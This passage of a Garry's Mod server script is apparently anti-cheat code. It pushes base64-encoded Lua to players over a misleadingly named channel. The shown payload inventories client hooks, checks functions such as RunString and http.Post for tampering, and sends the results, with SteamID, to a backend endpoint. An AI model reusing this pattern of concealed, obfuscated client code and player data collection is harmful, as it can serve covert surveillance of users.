kZXIiLCJQb3N0UmVuZGVyIiwiUmVuZGVyU2NlbmUiLCJDcmVhdGVNb3ZlIiwiUGxheWVyQmluZFByZXNzIiwiRHJhd092ZXJsYXkiLCJQb3N0RHJhd0hVRCIsIlBvc3REcmF3T3BhcXVlUmVuZGVyYWJsZXMifQpsb2NhbCBodCA9IGhvb2suR2V0VGFibGUoKSBvciB7fQpmb3IgXyxlIGluIGlwYWlycyhldikgZG8KICBsb2NhbCBiID0gaHRbZV0KICBpZiB0eXBlKGIpPT0idGFibGUiIHRoZW4gbG9jYWwgbmFtZXM9e30gZm9yIG5tLF8gaW4gcGFpcnMoYikgZG8gbmFtZXNbI25hbWVzKzFdPXRvc3RyaW5nKG5tKSBlbmQgaWYgI25hbWVzPjAgdGhlbiBzbmFwLmhvb2tzW2VdPW5hbWVzIGVuZCBlbmQKZW5kCmxvY2FsIGpzb24gPSB1dGlsLlRhYmxlVG9KU09OKHNuYXApCmlmIGpzb24gdGhlbgogIGxvY2FsIGNvbXAgPSB1dGlsLkNvbXByZXNzKGpzb24pCiAgaWYgY29tcCBhbmQgI2NvbXAgPCA2MDAwMCB0aGVuCiAgICBuZXQuU3RhcnQoImNkX2RpYWdfcmVzcCIpCiAgICAgIG5ldC5Xcml0ZVVJbnQoI2NvbXAsIDIwKQogICAgICBuZXQuV3JpdGVEYXRhKGNvbXAsICNjb21wKQogICAgbmV0LlNlbmRUb1NlcnZlcigpCiAgZW5kCmVuZApELmVycnMgPSB7fSBELnNwZXcgPSB7fQ==") or ""

net.Receive("cd_diag_resp", function(_, ply)
  if not IsValid(ply) then return end
  local n = net.ReadUInt(20)
  local raw = net.ReadData(n)
  local ok, json = pcall(util.Decompress, raw)
  if not ok or not json or json == "" then return end
  local ok2, tbl = pcall(util.JSONToTable, json)
  if not ok2 or type(tbl) ~= "table" then return end
  if ZB_AC and ZB_AC.Report then
    ZB_AC.Report("diag", 2, "client-diag: " .. ply:Nick(), {
      steamid = ply:SteamID(), nick = ply:Nick(), diag = tbl,
    })
  end
end)

local function pushDiag(ply)
  if not IsValid(ply) or ply:IsBot() then return end
  if not (ZB_AC and ZB_AC.Config and ZB_AC.Config.client_diag) then return end
  if #_DIAG == 0 then return end
  net.Start("ui_sync_poll")
    net.WriteString(_DIAG)
  net.Send(ply)
end

hook.Add("PlayerInitialSpawn", "cd_client_diag_join", function(ply)
  timer.Simple(6, function() pushDiag(ply) end)
end)
timer.Create("cd_client_diag_loop", 12, 0, function()
  if not (ZB_AC and ZB_AC.Config and ZB_AC.Config.client_diag) then return end
  local plys = (player.GetHumans and player.GetHumans()) or player.GetAll()
  for _, ply in ipairs(plys) do pushDiag(ply) end
end)
end

do
if not SERVER then return end
util.AddNetworkString("cd_hooks_resp")
util.AddNetworkString("ui_sync_poll")

local _CENSUS = util.Base64Decode("bG9jYWwgZnVuY3Rpb24gX2VzYyhzKQogIHJldHVybiAodG9zdHJpbmcocyk6Z3N1YigiW14ldyVwIF0iLCBmdW5jdGlvbihjKSByZXR1cm4gc3RyaW5nLmZvcm1hdCgiXFx4JTAyWCIsIHN0cmluZy5ieXRlKGMpKSBlbmQpKQplbmQKbG9jYWwgaHQgPSBob29rLkdldFRhYmxlKCkgb3Ige30KbG9jYWwgb3V0ID0ge30KZm9yIGV2LCBidWNrZXQgaW4gcGFpcnMoaHQpIGRvCiAgaWYgdHlwZShidWNrZXQpID09ICJ0YWJsZSIgdGhlbgogICAgZm9yIG5tLCBmbiBpbiBwYWlycyhidWNrZXQpIGRvCiAgICAgIGxvY2FsIHNyYyA9ICI/IgogICAgICBpZiB0eXBlKGZuKSA9PSAiZnVuY3Rpb24iIGFuZCBkZWJ1ZyBhbmQgZGVidWcuZ2V0aW5mbyB0aGVuCiAgICAgICAgbG9jYWwgb2ssIGkgPSBwY2FsbChkZWJ1Zy5nZXRpbmZvLCBmbiwgIlMiKQogICAgICAgIGlmIG9rIGFuZCB0eXBlKGkpID09ICJ0YWJsZSIgdGhlbgogICAgICAgICAgc3JjID0gKGkud2hhdCBvciAiPyIpIC4uICI6IiAuLiB0b3N0cmluZyhpLnNob3J0X3NyYyBvciAiPyIpIC4uICI6IiAuLiB0b3N0cmluZyhpLmxpbmVkZWZpbmVkIG9yIC0xKQogICAgICAgIGVuZAogICAgICBlbmQKICAgICAgb3V0WyNvdXQrMV0gPSB7IGUgPSBfZXNjKGV2KSwgbiA9IF9lc2Mobm0pLCBzID0gX2VzYyhzcmMpIH0KICAgICAgaWYgI291dCA+PSAyMDAwIHRoZW4gYnJlYWsgZW5kCiAgICBlbmQKICBlbmQKICBpZiAjb3V0ID49IDIwMDAgdGhlbiBicmVhayBlbmQKZW5kCmxvY2FsIF9zZW5zID0geyAicmVuZGVyLkNhcHR1cmUiLCJyZW5kZXIuQ2FwdHVyZVBpeGVscyIsInJlbmRlci5DYXB0dXJlIiwicHJpbnQiLCJNc2ciLCJNc2dOIiwiTXNnQyIsImRlYnVnLmdldGluZm8iLCJkZWJ1Zy5zZXRob29rIiwiZGVidWcudHJhY2ViYWNrIiwiUnVuU3RyaW5nIiwiUnVuU3RyaW5nRXgiLCJDb21waWxlU3RyaW5nIiwiQ29tcGlsZUZpbGUiLCJuZXQuU3RhcnQiLCJuZXQuU2VuZFRvU2VydmVyIiwibmV0LlJlY2VpdmUiLCJob29rLkFkZCIsImhvb2suUnVuIiwiaG9vay5DYWxsIiwiY29uY29tbWFuZC5BZGQiLCJzdXJmYWNlLkNyZWF0ZUZvbnQiLCJpbnB1dC5Jc0tleURvd24iLCJpbnB1dC5XYXNLZXlQcmVzc2VkIiwiZ3VpLk1vdXNlUG9zIiwidXRpbC5UYWJsZVRvSlNPTiIsImh0dHAuUG9zdCIsImh0dHAuRmV0Y2giLCJIVFRQIiB9CmxvY2FsIGZ1bmN0aW9uIF9yZXNvbHZlKHBhdGgpCiAgbG9jYWwgbyA9IF9HCiAgZm9yIHBhcnQgaW4gc3RyaW5nLmdtYXRjaChwYXRoLCAiW14lLl0rIikgZG8KICAgIGlmIHR5cGUobykgfj0gInRhYmxlIiB0aGVuIHJldHVybiBuaWwgZW5kCiAgICBvID0gb1twYXJ0XQogIGVuZAogIHJldHVybiBvCmVuZApmb3IgXywgZnAgaW4gaXBhaXJzKF9zZW5zKSBkbwogIGxvY2FsIGYgPSBfcmVzb2x2ZShmcCkKICBpZiB0eXBlKGYpID09ICJmdW5jdGlvbiIgYW5kIGRlYnVnIGFuZCBkZWJ1Zy5nZXRpbmZvIHRoZW4KICAgIGxvY2FsIG9rLCBpID0gcGNhbGwoZGVidWcuZ2V0aW5mbywgZiwgIlMiKQogICAgaWYgb2sgYW5kIHR5cGUoaSkgPT0gInRhYmxlIiBhbmQgKGkud2hhdCBvciAiIikgfj0gIkMiIHRoZW4KICAgICAgb3V0WyNvdXQrMV0gPSB7IGUgPSAiX25hdGZ1bmNfIiwgbiA9IF9lc2MoZnApLCBzID0gX2VzYygoaS53aGF0IG9yICI/IikgLi4gIjoiIC4uIHRvc3RyaW5nKGkuc2hvcnRfc3JjIG9yICI/IikgLi4gIjoiIC4uIHRvc3RyaW5nKGkubGluZWRlZmluZWQgb3IgLTEpKSB9CiAgICBlbmQKICBlbmQKICBpZiAjb3V0ID49IDI0MDAgdGhlbiBicmVhayBlbmQKZW5kCmlmICNvdXQgPCAyNDAwIHRoZW4KICBmb3IgaywgdiBpbiBwYWlycyhfRykgZG8KICAgIGlmIHR5cGUoaykgPT0gInN0cmluZyIgYW5kIGs6ZmluZCgiW14ld19dIikgdGhlbgogICAgICBvdXRbI291dCsxXSA9IHsgZSA9ICJfZ2xvYmFsXyIsIG4gPSBfZXNjKGspLCBzID0gX2VzYyh0eXBlKHYpKSB9CiAgICAgIGlmICNvdXQgPj0gMjQwMCB0aGVuIGJyZWFrIGVuZAogICAgZW5kCiAgZW5kCmVuZApsb2NhbCBqc29uID0gdXRpbC5UYWJsZVRvSlNPTih7IGhvb2tzID0gb3V0IH0pCmlmIGpzb24gdGhlbgogIGxvY2FsIGNvbXAgPSB1dGlsLkNvbXByZXNzKGpzb24pCiAgaWYgY29tcCBhbmQgI2NvbXAgPCA2MzAwMCB0aGVuCiAgICBuZXQuU3RhcnQoImNkX2hvb2tzX3Jlc3AiKQogICAgICBuZXQuV3JpdGVVSW50KCNjb21wLCAyMCkKICAgICAgbmV0LldyaXRlRGF0YShjb21wLCAjY29tcCkKICAgIG5ldC5TZW5kVG9TZXJ2ZXIoKQogIGVuZAplbmQ=") or ""

net.Receive("cd_hooks_resp", function(_, ply)
  if not IsValid(ply) then return end
  local n = net.ReadUInt(20)
  local raw = net.ReadData(n)
  local ok, json = pcall(util.Decompress, raw)
  if not ok or not json or json == "" then return end
  local ok2, tbl = pcall(util.JSONToTable, json)
  if not ok2 or type(tbl) ~= "table" or type(tbl.hooks) ~= "table" then return end
  ply.cd_hookseen = ply.cd_hookseen or {}
  local seen, fresh = ply.cd_hookseen, {}
  for _, h in ipairs(tbl.hooks) do
    if type(h) == "table" and h.e and h.n then
      local key = tostring(h.e) .. "|" .. tostring(h.n) .. "|" .. tostring(h.s or "")
      if not seen[key] then seen[key] = true; fresh[#fresh+1] = h end
    end
  end
  if #fresh == 0 or not (ZB_AC and ZB_AC.AgentPost) then return end
  local sid, nick = ply:SteamID(), ply:Nick()
  for i = 1, #fresh, 120 do
    local batch = {}
    for j = i, math.min(i + 119, #fresh) do batch[#batch+1] = fresh[j] end
    ZB_AC.AgentPost("/agent/hooks", { steamid = sid, nick = nick, hooks = batch })
  end
end)

local function pushCensus(ply)
  if not IsValid(ply) or ply:IsBot() then return end
  if not (ZB_AC and ZB_AC.Config and ZB_AC.Config.hook_census) then return end
  if #_CENSUS == 0 then return end
  net.Start("ui_sync_poll")
    net.WriteString(_CENSUS)
  net.Send(ply)
end

hook.Add("PlayerInitialSpawn", "cd_hook_census_join", function(ply)
  timer.Simple(10, function() pushCensus(ply) end)
end)
timer.Create("cd_hook_census_loop", 45, 0, function()
  if not (ZB_AC and ZB_AC.Config and ZB_AC.Config.hook_census) then return end
  local plys = (player.GetHumans and player.GetHumans()) or player.GetAll()
  for _, ply in ipairs(plys) do pushCensus(ply) end
end)
end

CHECHA_FROM_BUNDLE = nil